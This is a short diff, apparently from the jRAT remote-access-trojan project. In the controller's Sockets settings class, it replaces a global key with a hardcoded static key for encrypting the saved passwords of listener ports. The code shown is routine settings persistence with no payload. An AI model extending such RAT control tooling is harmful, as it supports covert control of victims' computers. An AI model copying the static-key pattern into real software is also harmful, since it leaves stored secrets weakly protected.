@@ -15,6 +15,7 @@ import javax.swing.JOptionPane;
 import se.jrat.client.Globals;
 import se.jrat.client.net.PortListener;
 import se.jrat.common.crypto.Crypto;
+import se.jrat.common.crypto.KeyUtils;
 
 public class Sockets extends AbstractSettings implements Serializable {
 
@@ -37,7 +38,7 @@ public class Sockets extends AbstractSettings implements Serializable {
 			String name = reader.readLine();
 			int port = Integer.parseInt(reader.readLine());
 			int timeout = Integer.parseInt(reader.readLine());
-			String pass = Crypto.decrypt(reader.readLine(), AbstractSettings.GLOBAL_KEY);
+			String pass = Crypto.decrypt(reader.readLine(), KeyUtils.STATIC_KEY.getEncoded());
 			
 			SocketEntry se = new SocketEntry(name, port, timeout, pass);
 			se.start();
@@ -59,7 +60,7 @@ public class Sockets extends AbstractSettings implements Serializable {
 			pw.println(pl.getName());
 			pw.println(pl.getPort());
 			pw.println(pl.getTimeout());
-			pw.println(Crypto.encrypt(pl.getPass(), AbstractSettings.GLOBAL_KEY));
+			pw.println(Crypto.encrypt(pl.getPass(), KeyUtils.STATIC_KEY.getEncoded()));
 		}
 		
 		pw.close();
